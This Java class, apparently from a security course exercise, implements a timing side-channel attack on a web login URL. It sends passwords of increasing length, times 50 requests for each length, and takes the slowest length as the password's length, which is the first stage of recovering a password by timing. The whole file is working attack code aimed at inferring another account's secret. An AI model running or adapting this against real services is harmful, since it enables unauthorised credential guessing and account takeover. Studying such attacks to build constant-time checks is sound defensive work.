package MainProject;

import java.io.IOException;
import java.util.ArrayList;
import java.util.Collections;

public class CheckPasswordLength {

    private String URL;
    private ArrayList<Double> timeMeasurements;
    private final int maxLength = 32;

    public CheckPasswordLength(String url) {
        this.URL = url+"?user=307832972&password=";
        timeMeasurements = new ArrayList<>();
    }

    /**
     * this function try different lengths and measure their connections to the site
     * fill the ArrayList with sum of times off all length
     */
    public void measureConnectionWithDifferentLength(){

        String tempURL = URL;

        for (int i=0;i<maxLength;i++){
            measureConnectionToGivenLength(tempURL);
            tempURL+="a";
        }
    }

    /**
     * this function will measure connection time to a given length
     * help func to measureConnectionWithDifferentLength()
     * @param tempURL - url that represents the given length
     */

    private void measureConnectionToGivenLength(String tempURL) {
        double totalTime = 0;
        try{

            for(int i=0;i<50;i++){
                TimeToConnect tmc = new TimeToConnect(tempURL);
                totalTime+= (Double) tmc.timeToConnect();
            }
        } catch (IOException e) {
            e.printStackTrace();
            System.out.println("error measure time for url: "+ tempURL);
        }
        timeMeasurements.add(totalTime);
    }

    /**
     * method to get the length of the password.
     * @return the index of max value in timeMeasurements array ==> the length of the password.
     */
    public int getLength(){
        double maxValue=  Collections.max(timeMeasurements);
        System.out.println("The max time of measurement is "+maxValue );
        return timeMeasurements.indexOf(maxValue);
    }


}
